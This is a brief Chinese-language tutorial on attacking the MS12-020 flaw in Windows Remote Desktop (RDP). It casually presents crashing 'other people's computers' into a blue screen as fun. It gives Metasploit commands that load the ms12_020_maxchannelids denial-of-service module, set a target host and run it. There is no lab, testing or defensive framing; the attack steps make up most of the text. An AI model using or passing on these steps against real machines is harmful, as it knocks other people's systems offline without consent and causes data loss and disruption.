ms12-020远程代码执行漏洞攻击-之Windows蓝屏攻击

简介

ms12-020是Windows远程桌面协议RDP的一个远程代码执行漏洞,可以利用它来干一些好玩的事情例如攻击别人电脑蓝屏

攻击步骤:

search ms12-020

use auxiliary/dos/windows/rdp

/ms12_020_maxchannelids

set rhosts 192.168.0.0

run
